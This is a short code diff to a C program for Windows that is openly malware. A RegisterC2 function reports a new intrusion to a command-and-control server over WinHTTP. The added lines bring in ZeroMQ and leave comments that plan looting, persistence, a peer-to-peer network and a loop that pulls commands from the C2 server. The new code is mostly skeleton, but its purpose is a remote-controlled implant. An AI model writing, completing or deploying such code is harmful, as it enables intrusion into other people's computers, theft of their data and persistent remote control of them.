@@ -20,8 +20,11 @@
 #include <windows.h>
 #include <stdio.h>
 #include <winhttp.h>
+#include <zmq.h>
 
 void RegisterC2(_TCHAR* gid){
+
+    void *context = zmq_ctx_new();
 
     HINTERNET session = WinHttpOpen(
         L"Diplomat", 
@@ -92,10 +95,18 @@ void RegisterC2(_TCHAR* gid){
 }
 
 int _tmain(int argc, _TCHAR *argv[]){
+    // First node executed on the network, woohoo!
     if(argc == 2){
         // Report intrusion to C2
         _TCHAR* gid = malloc(64);
         sprintf(gid, "239");
         RegisterC2(gid);
     }
+
+    // Do malware things (investigation, looting, persistence)
+    
+    // Establish peer network
+    // Create a router for recieving messages
+
+    // Timed loop for checking potential peers and retrieving commands from c2
 }
